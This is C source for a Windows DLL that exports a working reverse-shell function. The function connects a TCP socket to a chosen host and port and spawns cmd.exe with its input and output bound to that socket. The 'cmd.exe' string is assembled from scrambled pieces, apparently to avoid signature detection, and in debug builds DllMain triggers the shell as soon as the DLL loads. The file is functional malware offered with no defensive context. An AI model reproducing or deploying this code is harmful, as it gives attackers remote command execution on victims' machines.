#include "main.h"


WSADATA wsaData;

int DLL_EXPORT ReverShell(char* ip, int port)
{
    struct hostent *host;
    SOCKET Winsock;
    struct sockaddr_in shell;
    char aip_addr[16];
    STARTUPINFO ini_processo;
    PROCESS_INFORMATION processo_info;

    if(!ip || !port)
        return -1;

    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
    host = gethostbyname(ip);
    strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    shell.sin_family = AF_INET;
    shell.sin_port = htons(port);
    shell.sin_addr.s_addr =inet_addr(aip_addr);
    WSAConnect(Winsock,(SOCKADDR*)&shell, sizeof(shell),NULL,NULL,NULL,NULL);

    if (!WSAGetLastError())
    {
        memset(&ini_processo, 0, sizeof(ini_processo));
        ini_processo.cb=sizeof(ini_processo);
        ini_processo.dwFlags=STARTF_USESTDHANDLES;
        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

        char *myArray[4] = { "d.e", "x", "e","cm" };
        char command[8] = "";
        snprintf(command,8, "%s%s%s%s", myArray[3], myArray[0], myArray[1], myArray[2]);
        if(!CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info))
            return -2;
        memset(command,0,8);
        return 0;
    }
    else
        return -3;
}
#ifdef __cplusplus
extern "C"
#endif
 DLL_EXPORT BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if(fdwReason == DLL_PROCESS_ATTACH)
    {
        if(WSAStartup((WORD)((2) << 8 | (2)), &wsaData))
            return FALSE;
#ifdef DEBUG
        int s;
        char str[4];
        s=ReverShell("127.0.0.1",1024);
        sprintf(str,"S:%d",s);
        MessageBox( NULL, str, "Hi!", MB_OK );
#endif // DEBUG

    }
    return TRUE;
}
